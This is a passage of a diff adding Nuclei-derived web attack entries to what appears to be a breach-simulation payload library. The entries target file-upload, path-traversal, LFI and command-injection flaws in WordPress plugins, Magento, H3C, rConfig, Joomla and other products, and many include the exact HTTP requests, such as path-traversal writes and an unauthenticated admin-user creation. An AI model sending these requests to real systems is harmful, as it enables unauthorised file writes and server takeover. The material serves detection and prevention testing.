+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=------------------------7RKjWLYyrhvUn2AA31fJQ3"
+      }
+    ],
+    "web_request_body": "--------------------------7RKjWLYyrhvUn2AA31fJQ3\nContent-Disposition: form-data; name=\"file\"; filename=\"{{to_lower(rand_text_alpha(5))}}.png\"\nContent-Type: image/png\n\n{{randstr}}\n--------------------------7RKjWLYyrhvUn2AA31fJQ3\nContent-Disposition: form-data; name=\"storageFolderID\"\n\n1\n--------------------------7RKjWLYyrhvUn2AA31fJQ3\nContent-Disposition: form-data; name=\"portalID\"\n\n0\n--------------------------7RKjWLYyrhvUn2AA31fJQ3\nContent-Disposition: form-data; name=\"overrideFiles\"\n\n1\n--------------------------7RKjWLYyrhvUn2AA31fJQ3\nContent-Disposition: form-data; name=\"mode\"\n\nDefault\n--------------------------7RKjWLYyrhvUn2AA31fJQ3--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "\\{\"group\"|delete_type"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress midi-Synth <= 1.1.0 - Unauthenticated Arbitrary File Upload (Nuclei: CVE-2026-1306)",
+    "payload_external_id": "B8-UPLOAD-079",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2026-1306 by pussycat0x] WordPress midi-Synth plugin \\u003C= 1.1.0 contains an unrestricted file upload vulnerability caused by missing file type and extension validation in the 'export' AJAX action, letting unauthenticated attackers upload arbitrary files and potentially execute remote code, exploit requires attacker to...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WPvivid Backup & Migration <= 0.9.123 - Arbitrary File Upload (Nuclei: CVE-2026-1357)",
+    "payload_external_id": "B8-UPLOAD-080",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2026-1357 by omarkurt] WPvivid Backup & Migration plugin for WordPress <= 0.9.123 contains an unauthenticated arbitrary file upload vulnerability caused by improper error handling in RSA decryption and lack of path sanitization, letting unauthenticated attackers upload arbitrary PHP files and achieve remote code execut...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/uploads/vt-nuclei-test.txt",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "CVE\\-2026\\-1357\\-nuclei\\-verification\\-test"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress Slider Future <= 1.0.5 - Unauthenticated Arbitrary File Upload (Nuclei: CVE-2026-1405)",
+    "payload_external_id": "B8-UPLOAD-081",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2026-1405 by pussycat0x] Slider Future WordPress plugin <= 1.0.5 contains an unrestricted file upload vulnerability caused by missing file type validation in 'slider_future_handle_image_upload', letting unauthenticated attackers upload arbitrary files, exploit requires no authentication.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-json/slider-future/v1/upload-image/",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/json"
+      }
+    ],
+    "web_request_body": "{\"image_url\":\"http://{{interactsh-url}}\"}",
+    "web_request_body_type": "json",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Breeze <= 2.4.4 - Arbitrary File Upload (Nuclei: CVE-2026-3844)",
+    "payload_external_id": "B8-UPLOAD-082",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2026-3844 by theamanrawat,ritikchaddha] Breeze Cache WordPress plugin <= 2.4.4 contains an unrestricted file upload vulnerability caused by missing file type validation in 'fetch_gravatar_from_remote' function, letting unauthenticated attackers upload arbitrary files, exploit requires 'Host Files Locally - Gravatars' enabled.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/cache/breeze-extra/gravatars/{{randstr}}.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Fortinet FortiSandbox - Command Injection (Nuclei: CVE-2026-39808)",
+    "payload_external_id": "B8-UPLOAD-083",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2026-39808 by DhiyaneshDk] Fortinet FortiSandbox 4.4.0 through 4.4.8 contains a command injection caused by improper neutralization of special elements in OS commands, letting attackers execute unauthorized code or commands, exploit requires crafted input.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/ng/{{to_lower(rand_text_alpha(8))}}.txt",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "VvvebJs <= 2.0.5 - Cross-Site Scripting (Nuclei: CVE-2026-5615)",
+    "payload_external_id": "B8-UPLOAD-084",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2026-5615 by theamanrawat] Givanz Vvvebjs <= 2.0.5 contains a stored XSS caused by manipulation of the \"uploadAllowExtensions\" argument in upload.php File Upload Endpoint, letting remote attackers execute scripts, exploit requires crafted input.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/{{upload_path}}",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "KCFinder - Exposure (Nuclei: kcfinder-exposure)",
+    "payload_external_id": "B8-UPLOAD-085",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei kcfinder-exposure by theamanrawat] Detected publicly accessible KCFinder instances that may have allowed arbitrary file uploads and remote code execution (RCE).Exposure of KCFinder could have allowed an attacker to gain unauthorized access to the file manager and upload malicious files.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "<title>KCFinder:|id=\"files\""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "CodiMD - File Upload (Nuclei: codimd-unauth-file-upload)",
+    "payload_external_id": "B8-UPLOAD-086",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei codimd-unauth-file-upload by denandz,PulseSecurity.co.nz] CodiMD does not require valid authentication to access uploaded images or to upload new image data. An attacker who can determine an uploaded image's URL can gain unauthorised access to uploaded image data, or can create a denial of service condition by exhausting all available disk space.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/uploadimage",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=---------------------------92633278134516118923780781161"
+      }
+    ],
+    "web_request_body": "-----------------------------92633278134516118923780781161\nContent-Disposition: form-data; name=\"image\"; filename=\"{{randstr}}.gif\"\nContent-Type: image/gif\n\n{{base64_decode(\"R0lGODlhAQABAIABAP///wAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\")}}\n-----------------------------92633278134516118923780781161--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "\"link\":\".*?.gif\""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Dahua Bitmap - File Upload Remote Code Execution (Nuclei: dahua-bitmap-fileupload)",
+    "payload_external_id": "B8-UPLOAD-087",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei dahua-bitmap-fileupload by DhiyaneshDK] Dahua Bitmap - File Upload Remote Code Execution",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/upload/{{randstr}}.jsp",
+    "web_request_headers": [
+      {
+        "name": "Hostname",
+        "value": "{{Hostname}}"
+      }
+    ],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "\\{\\{base64_decode\\(cmd\\)\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "IDoc View /html/2word - Arbitrary File Upload (Nuclei: idocview-2word-fileupload)",
+    "payload_external_id": "B8-UPLOAD-088",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei idocview-2word-fileupload by DhiyaneshDK] IDoc View /html/2word - Arbitrary File Upload",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/html/2word?url={{to_lower(rand_text_alpha(5))}}",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Infinitt PACS System - Arbitary File Upload (Nuclei: infinitt-pacs-file-upload)",
+    "payload_external_id": "B8-UPLOAD-089",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei infinitt-pacs-file-upload by adeljck] Infinitt PACS System is vulnerable to file upload vulnerability which allows an attacker to upload a webshell and gain unauthorized access to the server.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/webservices/WebJobUpload.asmx",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "text/xml; charset=utf-8"
+      },
+      {
+        "name": "Soapaction",
+        "value": "\"http://rainier/jobUpload\""
+      }
+    ],
+    "web_request_body": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n<soap:Body>\n<jobUpload xmlns=\"http://rainier\">\n<vcode>1</vcode>\n<subFolder></subFolder>\n<fileName>{{to_lower(rand_text_alpha(5))}}.aspx</fileName>\n<bufValue>MTIz</bufValue>\n</jobUpload>\n</soap:Body>\n</soap:Envelope>",
+    "web_request_body_type": "xml",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "<jobUploadResult>"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Easy Shop 1.2.3 - Local File Inclusion (Nuclei: joomla-easyshop-lfi)",
+    "payload_external_id": "B8-UPLOAD-090",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei joomla-easyshop-lfi by ritikchaddha] The Joomla! component Easy Shop version 1.2.3 is vulnerable to Local File Inclusion (LFI) attacks.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_easyshop&task=ajax.loadImage&file=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Magento PolyShell – Unauthenticated File Upload to RCE (Nuclei: magento-polyshell-rce)",
+    "payload_external_id": "B8-UPLOAD-091",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei magento-polyshell-rce by slcyber,DhiyaneshDk] Magento lacks file type validation on custom product options file upload feature accessible via unauthenticated REST/GraphQL APIs. Attackers can upload arbitrary PHP files through guest cart endpoints without authentication. Files are stored in pub/media/custom_options/quote/ directory with predi...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/pub/media/custom_options/quote/{{upload_subdir1}}/{{upload_subdir2}}/{{upload_filename}}",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "H3C CNSSS - Arbitrary File Upload (Nuclei: h3c-cnsss-arbitrary-file-upload)",
+    "payload_external_id": "B8-UPLOAD-092",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei h3c-cnsss-arbitrary-file-upload by s4e-io] H3C-Campus Network Self-Service System vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/imc/primepush/%2e%2e/flexFileUpload",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=---------------WebKitFormBoundaryMmx988TUuintqO4Q"
+      }
+    ],
+    "web_request_body": "-----------------WebKitFormBoundaryMmx988TUuintqO4Q\nContent-Disposition: form-data; name=\"{{rand_base(10)}}.txt\"; filename=\"{{rand_base(10)}}.txt\"\nContent-Type: application/octet-stream\n\n{{md5(num)}}\n-----------------WebKitFormBoundaryMmx988TUuintqO4Q--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "H3C CVM - Arbitrary File Upload (Nuclei: h3c-cvm-arbitrary-file-upload)",
+    "payload_external_id": "B8-UPLOAD-093",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei h3c-cvm-arbitrary-file-upload by SleepingBag945] An H3C CVM vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{rand_base(5)}}.jsp&name=222\"",
+    "web_request_headers": [
+      {
+        "name": "Content-range",
+        "value": "bytes 0-10/20"
+      },
+      {
+        "name": "Accept-Encoding",
+        "value": "gzip, deflate"
+      }
+    ],
+    "web_request_body": "{{rand_base(8)}}",
+    "web_request_body_type": "json",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Jan - Arbitrary File Upload (Nuclei: jan-file-upload)",
+    "payload_external_id": "B8-UPLOAD-094",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei jan-file-upload by pussycat0x] Jan's API interface writeFileSync and appendFileSync does not filter parameters, resulting in an arbitrary file upload vulnerability.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/v1/app/writeFileSync",
+    "web_request_headers": [
+      {
+        "name": "contentType",
+        "value": "application/json"
+      },
+      {
+        "name": "Content-Type",
+        "value": "text/plain;charset=UTF-8"
+      },
+      {
+        "name": "Origin",
+        "value": "{{RootURL}}"
+      }
+    ],
+    "web_request_body": "[\"/../../../../../tmp/{{to_lower(rand_base(5))}}.txt\",\"{{randstr}}\"]",
+    "web_request_body_type": "json",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "rConfig 3.9.5 - Arbitrary File Upload (Nuclei: rconfig-file-upload)",
+    "payload_external_id": "B8-UPLOAD-095",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei rconfig-file-upload by dwisiswant0] rConfig 3.9.5 is susceptible to an arbitrary file upload via the userprocess.php endpoint. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/lib/crud/userprocess.php",
+    "web_request_headers": [
+      {
+        "name": "Accept",
+        "value": "*/*"
+      },
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb"
+      },
+      {
+        "name": "Cookie",
+        "value": "PHPSESSID={{randstr}}"
+      }
+    ],
+    "web_request_body": "--01b28e152ee044338224bf647275f8eb\nContent-Disposition: form-data; name=\"username\"\n\n{{randstr}}\n--01b28e152ee044338224bf647275f8eb\nContent-Disposition: form-data; name=\"passconf\"\n\nTesting1@\n--01b28e152ee044338224bf647275f8eb\nContent-Disposition: form-data; name=\"password\"\n\nTesting1@\n--01b28e152ee044338224bf647275f8eb\nContent-Disposition: form-data; name=\"email\"\n\ntest@{{randstr}}.tld\n--01b28e152ee044338224bf647275f8eb\nContent-Disposition: form-data; name=\"editid\"\n\n\n--01b28e152ee044338224bf647275f8eb\nContent-Disposition: form-data; name=\"add\"\n\nadd\n--01b28e152ee044338224bf647275f8eb\nContent-Disposition: form-data; name=\"ulevelid\"\n\n9\n--01b28e152ee044338224bf647275f8eb--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      302
+    ],
+    "expected_body_regex": "User\\ \\{\\{randstr\\}\\}\\ successfully\\ added\\ to\\ Database"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Prestashop Blocktestimonial Modules - File Upload Vulnerability (Nuclei: prestashop-blocktestimonial-file-upload)",
+    "payload_external_id": "B8-UPLOAD-096",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei prestashop-blocktestimonial-file-upload by MaStErChO] Prestashop Blocktestimonial Modules - File Upload Vulnerability",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/modules/blocktestimonial/addtestimonial.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundaryLSo7Btb6nGcpR9Cl"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundaryLSo7Btb6nGcpR9Cl\nContent-Disposition: form-data; name=\"testimonial_submitter_name\"\n\n{{rand_base(6, \"abc\")}}\n------WebKitFormBoundaryLSo7Btb6nGcpR9Cl\nContent-Disposition: form-data; name=\"testimonial_title\"\n\n{{rand_base(6, \"abc\")}}\n------WebKitFormBoundaryLSo7Btb6nGcpR9Cl\nContent-Disposition: form-data; name=\"testimonial_main_message\"\n\n{{rand_base(6, \"abc\")}}\n------WebKitFormBoundaryLSo7Btb6nGcpR9Cl\nContent-Disposition: form-data; name=\"testimonial_img\"; filename=\"{{rand_base(7, \"abc\")}}.html\"\nContent-Type: text/html\n\n<html>\n<body>\n<h1>{{rand_base(6, \"abc\")}}</h1>\n</body>\n</html>\n\n------WebKitFormBoundaryLSo7Btb6nGcpR9Cl\nContent-Disposition: form-data; name=\"testimonial\"\n\nSubmit Testimonial\n------WebKitFormBoundaryLSo7Btb6nGcpR9Cl--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Prestashop Cart Abandonment Pro File Upload (Nuclei: prestashop-cartabandonmentpro-file-upload)",
+    "payload_external_id": "B8-UPLOAD-097",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei prestashop-cartabandonmentpro-file-upload by MaStErChO] Prestashop Cart Abandonment Pro File Upload",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/{{matched_path}}uploads/{{rand_base(7, \"abc\")}}.php.png",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Ruijie RG-UAC nmc_sync.php - Remote Code Execution (Nuclei: ruijie-nmc-sync-rce)",
+    "payload_external_id": "B8-UPLOAD-098",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
